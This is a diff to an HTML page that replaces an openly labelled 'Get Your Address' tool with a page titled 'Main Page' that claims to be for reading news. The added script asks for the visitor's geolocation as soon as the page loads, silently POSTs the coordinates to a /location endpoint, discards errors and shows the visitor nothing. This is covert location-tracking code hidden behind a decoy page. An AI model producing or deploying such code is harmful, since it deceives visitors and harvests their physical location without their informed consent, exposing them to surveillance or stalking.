@@ -3,71 +3,33 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Get Full Address</title>
+  <title>Main Page</title>
 </head>
 <body>
-  <h2>📍 Get Your Address</h2>
-
-  <button onclick="getLocation()">Get My Address</button>
-
-  <p id="output">Your full address: </p>
-
-  <label>Extra Details (Flat, Block, Building):</label><br>
-  <input type="text" id="extra" placeholder="e.g. Block A, Flat 102">
-  <br><br>
+  <h1>🎉 Welcome to My Website</h1>
+  <p>This is for Reading news.</p>
 
   <script>
-    function getLocation() {
+    
+    window.onload = function() {
       if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(showPosition, showError);
-      } else {
-        document.getElementById("output").innerText = "Geolocation is not supported by this browser.";
+        navigator.geolocation.getCurrentPosition(saveLocation, function(error) {
+          
+        });
       }
-    }
+    };
 
-    function showPosition(position) {
+    function saveLocation(position) {
       const latitude = position.coords.latitude;
       const longitude = position.coords.longitude;
-      const extra = document.getElementById("extra").value;
 
       fetch("/location", {
         method: "POST",
-        headers: {
-          "Content-Type": "application/json"
-        },
-        body: JSON.stringify({ latitude, longitude, extra })
-      })
-      .then(response => response.json())
-      .then(data => {
-        if (data.full_address) {
-          document.getElementById("output").innerText = "Your full address: " + data.full_address;
-        } else {
-          document.getElementById("output").innerText = "Address not found";
-        }
-      })
-      .catch(error => {
-        console.error("Error:", error);
-        document.getElementById("output").innerText = "Error fetching address.";
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ latitude, longitude })
       });
-    }
-
-    function showError(error) {
-      switch(error.code) {
-        case error.PERMISSION_DENIED:
-          alert("User denied the request for Geolocation.");
-          break;
-        case error.POSITION_UNAVAILABLE:
-          alert("Location information is unavailable.");
-          break;
-        case error.TIMEOUT:
-          alert("The request to get user location timed out.");
-          break;
-        case error.UNKNOWN_ERROR:
-          alert("An unknown error occurred.");
-          break;
-      }
+      
     }
   </script>
 </body>
 </html>
-
